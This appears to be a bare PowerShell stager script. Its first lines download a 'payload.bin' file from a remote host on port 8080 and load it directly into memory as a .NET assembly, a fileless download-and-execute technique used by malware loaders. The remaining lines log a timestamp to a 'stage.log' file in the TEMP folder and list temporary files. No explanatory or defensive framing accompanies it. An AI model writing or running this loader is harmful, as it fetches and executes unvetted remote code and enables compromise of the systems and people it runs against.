
$StageBytes = (New-Object System.Net.WebClient).DownloadData("http://adatum.com:8080/payload.bin")
[Reflection.Assembly]::Load($StageBytes)
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
